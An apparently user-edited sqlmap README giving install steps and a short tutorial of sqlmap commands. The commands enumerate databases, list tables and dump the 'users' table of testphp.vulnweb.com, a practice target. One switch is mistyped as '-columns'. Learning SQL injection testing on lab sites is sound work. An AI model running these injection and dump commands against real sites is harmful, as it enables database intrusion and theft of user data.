# sqlmap ![](https://i.imgur.com/fe85aVR.png)

[![.github/workflows/tests.yml](https://github.com/sqlmapproject/sqlmap/actions/workflows/tests.yml/badge.svg)](https://github.com/sqlmapproject/sqlmap/actions/workflows/tests.yml) [![Python 2.6|2.7|3.x](https://img.shields.io/badge/python-2.6|2.7|3.x-yellow.svg)](https://www.python.org/) [![License](https://img.shields.io/badge/license-GPLv2-red.svg)](https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/LICENSE) [![Twitter](https://img.shields.io/badge/twitter-@sqlmap-blue.svg)](https://twitter.com/sqlmap)

Installation
----

Preferably, you can download sqlmap by cloning the [Git](https://github.com/sqlmapproject/sqlmap) repository:

    git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

Usage
----

To get a list of basic options and switches use:

    python sqlmap.py -h

To get a list of all options and switches use:

    python sqlmap.py -hh

Web App
---
http://testphp.vulnweb.com/listproducts.php?cat=1

Code
---
   sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --batch --dbs 

To open database(acuart database name):

   sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --batch -D acuart --tables --dbs 


To get details of the table:

   sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --batch -D acuart -T users -columns --dump

